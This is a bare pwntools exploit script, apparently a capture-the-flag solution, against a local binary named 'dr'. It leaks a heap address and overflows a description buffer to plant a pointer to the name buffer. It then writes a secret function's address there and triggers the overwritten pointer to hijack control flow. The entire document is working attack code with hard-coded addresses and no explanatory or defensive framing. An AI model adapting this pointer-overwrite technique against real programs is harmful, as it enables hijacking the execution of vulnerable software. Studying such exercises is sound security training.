from pwn import *

p = process("./dr")

magic_function = 0x400ad6
name_addr = 0x602180

print p.recv()

p.sendline("31337")
print p.recv()

# set name
p.send("A"*(0x20))
data = p.recv()
data = data.split("A"*32)[1].split("\n")[0]

# heap leaking is not needed in this challenge
heap_addr = u64(data.ljust(8, "\x00"))
print hex(heap_addr)

# set roomA desc
payload = "B"*17
payload += p64(name_addr)
p.sendline("1")
print p.recv()
p.send(payload)
print p.recv()

# set name as magic function addr (secret_function)
p.sendline("31337")
print p.recv()

p.send(p64(magic_function))
print p.recv()

# trigger
p.sendline("3")

print p.recv()




